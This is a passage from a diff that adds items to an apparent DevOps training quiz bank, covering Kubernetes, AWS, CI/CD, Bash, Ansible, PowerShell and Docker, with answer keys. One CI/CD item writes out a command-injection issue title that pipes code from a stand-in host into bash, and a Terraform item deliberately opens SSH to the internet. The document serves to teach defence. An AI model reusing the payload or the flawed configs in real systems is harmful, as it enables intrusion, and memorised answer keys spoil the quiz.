+  explanation: "Object actions target object ARNs (`bucket/prefix/*`). Listing would also need `s3:ListBucket` on the **bucket** ARN with an `s3:prefix` condition. Avoid `s3:*` and `Resource: *` — IAM Access Analyzer can generate least-privilege policies from CloudTrail activity."
+
+- id: h-fill-k8s-004
+  category: Kubernetes
+  type: fill
+  title: "Gateway API: route to a Service"
+  scenario: "Route `api.acme.io/v1/*` from Gateway `public-gw` (namespace `gateway`) to Service `api` port 8080."
+  lang: yaml
+  template: |
+    apiVersion: gateway.networking.k8s.io/v1
+    kind: {{kind}}
+    metadata:
+      name: api
+      namespace: shop
+    spec:
+      {{parents}}:
+        - name: public-gw
+          namespace: gateway
+      hostnames: ["api.acme.io"]
+      rules:
+        - matches:
+            - path: { type: PathPrefix, value: /v1 }
+          {{backends}}:
+            - name: api
+              port: 8080
+  blanks:
+    kind:     { accept: ["^HTTPRoute$"], solution: HTTPRoute, width: 10 }
+    parents:  { accept: ["^parentRefs$"], solution: parentRefs, width: 11 }
+    backends: { accept: ["^backendRefs$"], solution: backendRefs, width: 12 }
+  explanation: "HTTPRoute attaches to a Gateway through `parentRefs` and forwards to `backendRefs`. A cross-namespace attachment must also be allowed by the Gateway's `allowedRoutes` (and backends in other namespaces need a ReferenceGrant)."
+
+# ------------------------------------------------------------------ SPOT THE BUG
+- id: h-spot-tf-001
+  category: Security
+  type: spot
+  title: "Code review: two findings"
+  scenario: "Your Checkov/Trivy job is down, so review by eye. Pick the **two** lines a PCI reviewer would block."
+  lang: hcl
+  code: |
+    resource "aws_security_group" "bastion" {
+      name   = "bastion"
+      vpc_id = var.vpc_id
+
+      ingress {
+        from_port   = 22
+        to_port     = 22
+        protocol    = "tcp"
+        cidr_blocks = ["0.0.0.0/0"]
+      }
+    }
+
+    resource "aws_db_instance" "cards" {
+      engine              = "postgres"
+      instance_class      = "db.r6g.large"
+      storage_encrypted   = false
+      password            = var.db_password
+      publicly_accessible = false
+    }
+  answer: [9, 16]
+  explanation: "Line 9 opens SSH to the internet — use SSM Session Manager or a PAM bastion, or restrict to a VPN CIDR. Line 16 leaves card-data storage unencrypted, failing PCI DSS Req. 3. `password = var.db_password` is fine as long as the variable is `sensitive`; better still is `manage_master_user_password = true`, so the password lives in Secrets Manager."
+
+- id: h-spot-k8s-001
+  category: Kubernetes
+  type: spot
+  title: "Why is this rejected by the API server?"
+  context:
+    - kind: terminal
+      title: apply
+      content: |
+        $ kubectl apply -f worker.yaml
+        The Deployment "worker" is invalid: spec.template.metadata.labels: Invalid value: map[string]string{"app":"worker-v2"}: `selector` does not match template `labels`
+  lang: yaml
+  code: |
+    apiVersion: apps/v1
+    kind: Deployment
+    metadata:
+      name: worker
+    spec:
+      replicas: 2
+      selector:
+        matchLabels:
+          app: worker
+      template:
+        metadata:
+          labels:
+            app: worker-v2
+        spec:
+          containers:
+            - name: worker
+              image: ghcr.io/acme/worker:1.0.0
+  answer: [13]
+  explanation: "Template labels must satisfy the selector. Don't fix it by changing `selector` on an existing Deployment — selectors are immutable. Keep stable selector labels and put version info in other labels (`app.kubernetes.io/version`)."
+
+- id: h-spot-cicd-001
+  category: CI/CD
+  type: spot
+  title: "Script injection in a workflow"
+  scenario: "An attacker opens an issue titled `x\"; curl evil.sh | bash; echo \"`. Which line executes it?"
+  lang: yaml
+  code: |
+    name: triage
+    on:
+      issues:
+        types: [opened]
+    permissions:
+      issues: write
+    jobs:
+      label:
+        runs-on: ubuntu-latest
+        steps:
+          - name: Label
+            env:
+              GH_TOKEN: ${{ github.token }}
+            run: |
+              echo "New issue: ${{ github.event.issue.title }}"
+              gh issue edit ${{ github.event.issue.number }} --add-label triage
+  answer: [15]
+  explanation: "`${{ }}` is expanded into the script *before* bash runs, so the title becomes code. Pass untrusted values through env vars (`env: TITLE: ${{ github.event.issue.title }}` → `echo \"$TITLE\"`). The issue number is numeric and safe. Linters such as zizmor and actionlint catch this."
+
+# ------------------------------------------------------------------ HARD SCENARIO MCQ / ORDER
+- id: h-k8s-mcq-001
+  category: Kubernetes
+  type: mcq
+  title: "Requests, limits and throttling"
+  scenario: "p99 latency of a Go API spikes every few seconds, yet the Pod's average CPU is only 40% of its 1-core limit."
+  context:
+    - kind: terminal
+      title: cgroup
+      content: |
+        $ kubectl exec api-7c9-xk2 -- cat /sys/fs/cgroup/cpu.stat
+        usage_usec 98120331
+        nr_periods 412882
+        nr_throttled 151204
+        throttled_usec 61202245
+  question: "What's happening?"
+  options:
+    - "CFS quota throttling — bursts exceed the limit within 100ms periods; raise/remove the CPU limit and set GOMAXPROCS to match"
+    - "The node is out of memory"
+    - "Liveness probes are failing"
+    - "The Pod has too many replicas"
+  answer: 0
+  explanation: "37% of periods were throttled. Averages hide burstiness: a multi-threaded runtime can burn the whole quota in a few milliseconds and then stall until the next period. Common fixes are dropping CPU limits (keep requests), raising them, or setting `GOMAXPROCS` (e.g. automaxprocs) to the limit."
+
+- id: h-aws-mcq-001
+  category: AWS
+  type: multi
+  title: "Cross-region egress via a proxy"
+  scenario: "ECS tasks in `me-central-1` must call a partner API that allow-lists only **eu-central-1** IPs. You route through a Squid proxy in eu-central-1."
+  question: "Which pieces are required for a robust setup? (select all)"
+  options:
+    - "Squid instances in eu-central-1 with Elastic IPs (or behind NAT with EIPs) that the partner allow-lists"
+    - "Private connectivity between regions (TGW inter-region peering or VPC peering) so tasks reach the proxy privately"
+    - "`HTTPS_PROXY` (and `NO_PROXY` for AWS endpoints/internal) set in the task definition"
+    - "Changing the ECS tasks' region in the task definition to eu-central-1"
+  answer: [0, 1, 2]
+  explanation: "The source IP the partner sees is the proxy's egress IP, so it must be a stable EIP. Tasks need a private path to the proxy, and the env vars must route only partner traffic through it (`NO_PROXY` for `169.254.170.2`, `.amazonaws.com`, internal domains). The task definition's region can't be changed."
+
+- id: h-obs-mcq-001
+  category: Observability
+  type: mcq
+  title: "Histogram quantiles"
+  scenario: "You need the p95 latency per service across all Pods."
+  question: "Which PromQL is correct for a Prometheus histogram?"
+  options:
+    - "`histogram_quantile(0.95, sum by (le, service) (rate(http_request_duration_seconds_bucket[5m])))`"
+    - "`avg(http_request_duration_seconds{quantile=\"0.95\"})`"
+    - "`quantile(0.95, http_request_duration_seconds_bucket)`"
+    - "`max(rate(http_request_duration_seconds_sum[5m]))`"
+  answer: 0
+  explanation: "Rate the buckets, sum them across Pods **keeping `le`**, then compute the quantile. You can't average pre-computed summary quantiles across instances."
+
+- id: h-order-k8s-001
+  category: Kubernetes
+  type: order
+  title: "EKS control-plane upgrade runbook"
+  question: "Order the steps for upgrading EKS 1.32 → 1.33 safely."
+  items:
+    - "Check deprecated APIs and add-on compatibility (EKS upgrade insights, kubent/pluto)"
+    - "Upgrade the control plane to 1.33"
+    - "Upgrade managed add-ons (VPC CNI, CoreDNS, kube-proxy, EBS CSI) to 1.33-compatible versions"
+    - "Roll the data plane: update Karpenter EC2NodeClass AMI / managed node groups, respecting PDBs"
+    - "Verify workloads and SLO dashboards, then update IaC to the new versions"
+  explanation: "Removed APIs break first, so check them first. The control plane must lead (kubelets may lag behind the API server, but not run ahead of it). Add-ons follow the control plane, then nodes roll with PDBs protecting availability, and finally IaC is updated so there's no drift."
+
+- id: h-order-inc-001
+  category: Security
+  type: order
+  title: "Leaked credential response"
+  question: "A long-lived IAM access key was found in a public repo. Order the response."
+  items:
+    - "Deactivate the key immediately"
+    - "Review CloudTrail for every action taken with that key"
+    - "Remove any persistence the attacker created (new users, keys, roles, Lambda, EC2)"
+    - "Rotate other secrets that might be exposed, and purge the key from Git history"
+    - "Post-incident: move CI to OIDC, enable secret scanning push protection"
+  explanation: "Contain, investigate, eradicate, recover, then prevent. Assume automated abuse within minutes of the push."
+
+# ------------------------------------------------------------------ MORE LIVE LABS (scripting, ansible, powershell, docker)
+- id: h-term-bash-001
+  category: Bash
+  type: terminal
+  title: "Live: who is hammering nginx?"
+  host: oncall@edge-01
+  prompt: "oncall@edge-01:/var/log/nginx$"
+  scenario: "5xx alerts on the public edge since 03:00. You're in `/var/log/nginx`. Fields in `access.log`: 1 = client IP, 7 = path, 9 = status. Answer with one-liners (awk, grep, sort, uniq, wc… any combination you like)."
+  explore:
+    - match: "^ls\\b"
+      output: |
+        access.log  access.log.1  error.log
+    - match: "^(head|tail)\\b.*access\\.log"
+      output: |
+        203.0.113.50 - - [16/Nov/2026:03:12:01 +0400] "POST /login HTTP/1.1" 503 162 "-" "python-requests/2.32"
+        198.51.100.7 - - [16/Nov/2026:03:12:01 +0400] "GET /api/v1/rates HTTP/2.0" 200 812 "-" "Mozilla/5.0"
+        203.0.113.50 - - [16/Nov/2026:03:12:01 +0400] "POST /login HTTP/1.1" 503 162 "-" "python-requests/2.32"
+    - match: "^wc -l\\b.*access\\.log$"
+      output: "412803 access.log"
+  steps:
+    - task: "Count the requests that returned any **5xx** status (field 9)."
+      accept:
+        - { all: ["^(awk|grep|cut|cat)\\b", "access\\.log", "5", "(wc -l|grep -\\w*c|END)"] }
+      solution: "awk '$9 ~ /^5/' access.log | wc -l"
+      tool: [awk, grep, cut, cat]
+      hint: "`awk '$9 ~ /^5/' access.log` prints only 5xx lines. Count them with `wc -l`."
+      output: "18442"
+    - task: "Show the **top 5** client IPs (field 1) by number of requests."
+      accept:
+        - { all: ["^(awk|cut|cat)\\b", "access\\.log", "\\bsort\\b", "uniq -c", "sort -(n?r|rn)\\b", "head (-n ?5|-5)\\b"] }
+      solution: "awk '{print $1}' access.log | sort | uniq -c | sort -rn | head -5"
+      tool: [awk, cut, cat, sort, grep]
+      hint: "Extract field 1, `sort | uniq -c` to count, `sort -rn` to rank, `head -5` to keep five."
+      wrong:
+        - match: { all: ["uniq -c"], none: ["\\bsort\\b.*uniq"] }
+          output: "# uniq only collapses ADJACENT duplicates — sort before uniq -c"
+      output: |
+          15921 203.0.113.50
+           3110 198.51.100.7
+           2876 192.0.2.44
+           2604 198.51.100.23
+           2251 192.0.2.9
+    - task: "How many of `203.0.113.50`'s requests went to `/login`?"
+      accept:
+        - { all: ["203\\.0\\.113\\.50", "/login", "(wc -l|grep -\\w*c|END)"] }
+      solution: "grep '^203.0.113.50 ' access.log | grep -c 'POST /login'"
+      tool: [awk, grep, cut, cat]
+      output: "15872"
+    - task: "What is it? Type `answer A`, `answer B` or `answer C` — A) a CDN edge node · B) a credential-stuffing bot hitting /login · C) the load balancer's health check"
+      accept: ["^answer [Bb]$"]
+      solution: answer B
+      tool: answer
+      output: "Correct — block or rate-limit it at the WAF/ingress (e.g. AWS WAF rate-based rule on /login) and alert on login 5xx/429 rates."
+  explanation: "`awk` + `sort | uniq -c | sort -rn | head` is the on-call triage pipeline you'll type for the rest of your career. 99.7% of one IP's requests are `POST /login` from `python-requests`, which is credential stuffing. Rate-limit it at the edge, not in the app."
+
+- id: h-term-py-001
+  category: Python
+  type: terminal
+  title: "Live: the report script won't run"
+  host: dev@ci-runner
+  prompt: "dev@ci-runner:~/billing-report$"
+  scenario: "A Python script `report.py` with a pinned `requirements.txt` fails on a fresh Ubuntu 24.04 runner. Get it running the right way — in an isolated environment."
+  explore:
+    - match: "^ls\\b"
+      output: "README.md  report.py  requirements.txt"
+    - match: "^cat requirements\\.txt"
+      output: |
+        boto3==1.35.36
+        pandas==2.2.3
+    - match: "^python3? --version"
+      output: "Python 3.12.3"
+  steps:
+    - task: "Run `report.py` to see the error."
+      accept: ["^python3? report\\.py$"]
+      solution: python3 report.py
+      output: |
+        Traceback (most recent call last):
+          File "/home/dev/billing-report/report.py", line 3, in <module>
+            import boto3
+        ModuleNotFoundError: No module named 'boto3'
+    - task: "Create a virtual environment in `.venv`."
+      accept: ["^python3? -m venv \\.venv/?$", "^virtualenv \\.venv/?$", "^uv venv( \\.venv/?)?$"]
+      solution: python3 -m venv .venv
+      tool: [python3 -m, python -m, pip, pip3, virtualenv, uv]
+      hint: "The standard library has a `venv` module: `python3 -m venv <dir>`."
+      wrong:
+        - match: "^(pip3?|python3? -m pip) install"
+          output: |
+            error: externally-managed-environment
+            × This environment is externally managed
+            ╰─> To install Python packages system-wide, try apt install python3-xyz, or use a virtual environment.
+      output: ""
+    - task: "Activate it."
+      accept: ["^(source|\\.) \\.venv/bin/activate$"]
+      solution: source .venv/bin/activate
+      tool: [source, ".", bash]
+      output: "(.venv) # the prompt now shows the active venv"
+    - task: "Install the pinned dependencies from `requirements.txt`."
+      accept: ["^(pip3?|python3? -m pip|uv pip) install (-r|--requirement) requirements\\.txt$"]
+      solution: pip install -r requirements.txt
+      tool: [pip, pip3, python3 -m, python -m, uv]
+      wrong:
+        - match: "install boto3$"
+          output: "Successfully installed boto3-1.35.90 ...   # unpinned — not the versions in requirements.txt (and pandas is still missing)"
+      output: |
+        Collecting boto3==1.35.36 (from -r requirements.txt (line 1))
+        Collecting pandas==2.2.3 (from -r requirements.txt (line 2))
+        Successfully installed boto3-1.35.36 botocore-1.35.36 numpy-2.1.3 pandas-2.2.3 ...
+    - task: "Run the report again."
+      accept: ["^python3? report\\.py$"]
+      solution: python report.py
+      output: |
+        Fetched 12,408 settlement rows from s3://acme-billing/2026-11/
+        Wrote report-2026-11.csv
+  explanation: "Recent Debian and Ubuntu mark the system Python as externally managed (PEP 668), so a global `pip install` is refused, and `sudo pip` breaks OS tools. Use a venv per project (or `uv`), install from the **pinned** file, and in CI cache the venv or the wheel cache keyed on the hash of `requirements.txt`."
+
+- id: h-term-ansible-001
+  category: Ansible
+  type: terminal
+  title: "Live: roll an nginx change safely"
+  host: ops@control
+  prompt: "ops@control:~/ansible$"
+  scenario: "You changed the nginx template in `site.yml`. Inventory is `inventory.ini` (group `web`: web1, web2). Verify, dry-run on one host, then apply to that host only."
+  explore:
+    - match: "^ls\\b"
+      output: "ansible.cfg  inventory.ini  roles/  site.yml"
+    - match: "^cat inventory\\.ini"
+      output: |
+        [web]
+        web1 ansible_host=10.0.4.11
+        web2 ansible_host=10.0.4.12
+  steps:
+    - task: "Check connectivity to **all** hosts in the inventory with the ping module."
+      accept: [{ all: ["^ansible (all|web)\\b", "-m (ansible\\.builtin\\.)?ping\\b"] }]
+      solution: ansible all -i inventory.ini -m ping
+      tool: ansible
+      hint: "Ad-hoc: `ansible <pattern> -i <inventory> -m <module>`."
+      output: |
+        web1 | SUCCESS => { "changed": false, "ping": "pong" }
+        web2 | UNREACHABLE! => { "changed": false, "msg": "Failed to connect to the host via ssh: ssh: connect to host 10.0.4.12 port 22: Connection timed out", "unreachable": true }
+    - task: "web2 is down for maintenance anyway. Check `site.yml` for syntax errors without running it."
+      accept: [{ all: ["^ansible-playbook\\b", "site\\.yml", "--syntax-check"] }]
+      solution: ansible-playbook -i inventory.ini site.yml --syntax-check
+      tool: ansible-playbook
+      output: "playbook: site.yml"
+    - task: "Dry-run against **only web1**, showing the file diffs."
+      accept: [{ all: ["^ansible-playbook\\b", "site\\.yml", "(--check|-C)\\b", "(--diff|-D)\\b", "(--limit|-l)[ =]?web1\\b"] }]
+      solution: ansible-playbook -i inventory.ini site.yml --limit web1 --check --diff
+      tool: ansible-playbook
+      hint: "Three flags: one to restrict hosts, one for check mode, one to show diffs."
+      wrong:
+        - match: { all: ["^ansible-playbook", "site\\.yml"], none: ["(--limit|-l)"] }
+          output: "# that targets every host in the play — the task says web1 only"
+      output: |
+        TASK [nginx : render nginx.conf] ***********************************************
+        --- before: /etc/nginx/nginx.conf
+        +++ after: /home/ops/.ansible/tmp/nginx.conf.j2
+        @@ -31,7 +31,7 @@
+        -    keepalive_timeout 65;
+        +    keepalive_timeout 15;
+        changed: [web1]
+        RUNNING HANDLER [nginx : reload nginx] *****************************************
+        changed: [web1]
+        PLAY RECAP *********************************************************************
+        web1 : ok=6  changed=2  unreachable=0  failed=0  skipped=0
+    - task: "Diff looks right. Apply it for real to **web1** only."
+      accept: [{ all: ["^ansible-playbook\\b", "site\\.yml", "(--limit|-l)[ =]?web1\\b"], none: ["(--check|-C)\\b"] }]
+      solution: ansible-playbook -i inventory.ini site.yml --limit web1
+      tool: ansible-playbook
+      output: |
+        PLAY RECAP *********************************************************************
+        web1 : ok=6  changed=2  unreachable=0  failed=0  skipped=0
+  explanation: "Ping proves reachability and auth, `--syntax-check` catches YAML and Jinja errors, and `--check --diff --limit` shows exactly what would change on one canary before you touch the fleet. In a real rollout you'd then use `serial:` in the play (or `--limit web2` later) to go host by host."
+
+- id: h-term-ps-001
+  category: PowerShell
+  type: terminal
+  title: "Live: IIS is down (PowerShell)"
+  host: Administrator@WIN-APP01
+  prompt: "PS C:\\Users\\Administrator>"
+  ignoreCase: true
+  scenario: "The legacy partner portal on `WIN-APP01` (IIS) returns nothing on 443 after the weekend's patching. Use PowerShell to find out why and bring it back. Cmdlets are case-insensitive here, as in real PowerShell."
+  explore:
+    - match: "^get-service$"
+      output: |
+        Status   Name               DisplayName
+        ------   ----               -----------
+        Stopped  W3SVC              World Wide Web Publishing Service
+        Stopped  WAS                Windows Process Activation Service
+        Running  WinRM              Windows Remote Management (WS-Manag...
+    - match: "^get-service (-name )?was$"
+      output: |
+        Status   Name   DisplayName
+        ------   ----   -----------
+        Stopped  WAS    Windows Process Activation Service
+  steps:
+    - task: "Check the status of the IIS web service `W3SVC`."
+      accept: ["^get-service (-name )?['\"]?w3svc['\"]?$"]
+      solution: Get-Service -Name W3SVC
+      tool: get-service
+      output: |
+        Status   Name     DisplayName
+        ------   ----     -----------
+        Stopped  W3SVC    World Wide Web Publishing Service
+    - task: "Read the 5 newest events in the **System** log to see why it stopped."
+      accept:
+        - { all: ["^get-winevent\\b", "system", "-maxevents ?5\\b"] }
+        - { all: ["^get-eventlog\\b", "system", "-newest ?5\\b"] }
+      solution: Get-WinEvent -LogName System -MaxEvents 5
+      tool: [get-winevent, get-eventlog]
+      hint: "`Get-WinEvent -LogName System -MaxEvents 5`"
+      output: |
+        TimeCreated          Id LevelDisplayName Message
+        -----------          -- ---------------- -------
+        16/11/2026 06:02:11 7068 Error           The World Wide Web Publishing Service service depends on the Windows Process Activation Service service which failed to start because of the following error: The service cannot be started, either because it is disabled or because it has no enabled devices associated with it.
+        16/11/2026 06:02:10 7040 Information     The start type of the Windows Process Activation Service service was changed from auto start to disabled.
+    - task: "Set `WAS` back to start automatically."
+      accept: [{ all: ["^set-service\\b", "(-name )?['\"]?was['\"]?\\b", "-startuptype ['\"]?automatic['\"]?"] }]
+      solution: Set-Service -Name WAS -StartupType Automatic
+      tool: set-service
+      hint: "`Set-Service -Name <svc> -StartupType Automatic`"
+      wrong:
+        - match: "^start-service"
+          output: "Start-Service : Service 'Windows Process Activation Service (WAS)' cannot be started due to the following error: Cannot start service WAS on computer '.'. (it's still disabled)"
+      output: ""
+    - task: "Start `W3SVC` (it pulls in WAS as a dependency)."
+      accept: ["^start-service (-name )?['\"]?w3svc['\"]?$"]
+      solution: Start-Service -Name W3SVC
+      tool: [start-service, restart-service]
+      output: "WARNING: Waiting for service 'World Wide Web Publishing Service (W3SVC)' to start..."
+    - task: "Confirm port **443** answers on localhost."
+      accept: [{ all: ["^test-netconnection\\b", "localhost|127\\.0\\.0\\.1|win-app01", "-port ?443\\b"] }]
+      solution: Test-NetConnection -ComputerName localhost -Port 443
+      tool: test-netconnection
+      output: |
+        ComputerName     : localhost
+        RemoteAddress    : ::1
+        RemotePort       : 443
+        TcpTestSucceeded : True
+  explanation: "Event 7040 shows someone (or a hardening baseline) disabled WAS during patching, and event 7068 shows W3SVC failing on that dependency. `Set-Service -StartupType` then `Start-Service` fixes it, and `Test-NetConnection` is PowerShell's port check. Pin service start types in your configuration (DSC, Ansible `win_service`, GPO) so the next patch run can't undo them."
+
+- id: h-term-docker-002
+  category: Docker
+  type: terminal
+  title: "Live: why is this image 1.4 GB?"
+  host: dev@build-01
+  prompt: "dev@build-01:~/web$"
+  scenario: "The Node.js frontend image `acme/web:2.0` is suddenly 1.4 GB and slow to roll out. Find the fat layer, fix the build context, rebuild as `acme/web:2.1`, and compare."
+  explore:
+    - match: "^cat Dockerfile"
+      output: |
+        FROM node:22-alpine AS build
+        WORKDIR /app
+        COPY . .
+        RUN npm ci && npm run build
+        FROM nginx:1.27-alpine
+        COPY --from=build /app /usr/share/nginx/html
+    - match: "^ls( -a| -la| -al)?$"
+      output: ".dockerignore  Dockerfile  node_modules/  package.json  package-lock.json  public/  src/"
+    - match: "^du -sh node_modules"
+      output: "1.1G    node_modules"
+  steps:
+    - task: "List the local `acme/web` images and their sizes."
+      accept: ["^docker (images|image ls)\\b.*acme/web"]
+      solution: docker images acme/web
+      output: |
+        REPOSITORY   TAG   IMAGE ID       CREATED        SIZE
+        acme/web     2.0   4e1f7a9b2c3d   20 hours ago   1.42GB
+    - task: "Show the layer history of `acme/web:2.0`."
+      accept: ["^docker (image )?history\\b.*acme/web:2\\.0"]
+      solution: docker history acme/web:2.0
+      output: |
+        IMAGE          CREATED        CREATED BY                                      SIZE
+        4e1f7a9b2c3d   20 hours ago   COPY /app /usr/share/nginx/html # buildkit      1.37GB
+        <missing>      3 weeks ago    CMD ["nginx" "-g" "daemon off;"]                0B
+        <missing>      3 weeks ago    /bin/sh -c #(nop) ADD file:...                  48.6MB
+    - task: "The whole `/app` (with `node_modules`) is copied into nginx. First check what the build context ignores."
+      accept: ["^cat \\.dockerignore$"]
+      solution: cat .dockerignore
+      output: ".git"
+    - task: "**Append** `node_modules` to `.dockerignore` (don't overwrite the file)."
+      accept: ["^(echo|printf) (-e )?['\"]?(\\\\n)?node_modules/?(\\\\n)?['\"]? >> ?\\.dockerignore$"]
+      solution: echo "node_modules" >> .dockerignore
+      tool: [echo, printf, cat]
+      wrong:
+        - match: "[^>]> ?\\.dockerignore$"
+          output: "# single > overwrote the file — .git is no longer ignored. Use >>"
+      output: ""
+    - task: "Rebuild as `acme/web:2.1`. (The Dockerfile's last COPY should also take only `/app/dist` — assume a teammate just pushed that fix.)"
+      accept: [{ all: ["^docker (buildx )?build\\b", "(-t|--tag)[ =]?acme/web:2\\.1\\b", "\\s\\.$|\\s\\.\\s"] }]
+      solution: docker build -t acme/web:2.1 .
+      tool: [docker build, docker buildx]
+      hint: "`docker build -t <name:tag> <context>` — the context is the current directory."
+      output: |
+        [+] Building 24.6s (12/12) FINISHED
+         => [internal] load .dockerignore                                    0.0s
+         => [internal] load build context                                    0.2s
+         => => transferring context: 1.84MB                                  0.1s
+         => exporting to image                                               0.3s
+         => => naming to docker.io/acme/web:2.1                              0.0s
+    - task: "Compare the sizes again."
+      accept: ["^docker (images|image ls)\\b.*acme/web"]
+      solution: docker images acme/web
+      output: |
+        REPOSITORY   TAG   IMAGE ID       CREATED          SIZE
+        acme/web     2.1   9b8c7d6e5f4a   10 seconds ago   52.3MB
+        acme/web     2.0   4e1f7a9b2c3d   20 hours ago     1.42GB
+  explanation: "`docker history` points at the fat layer. A missing `.dockerignore` entry sends `node_modules` into the build context (slow builds), and copying the whole work dir into the runtime stage ships it. Ignore build junk, copy only the build output (`/app/dist`), and watch for `>` vs `>>` — overwriting `.dockerignore` silently starts shipping `.git`."
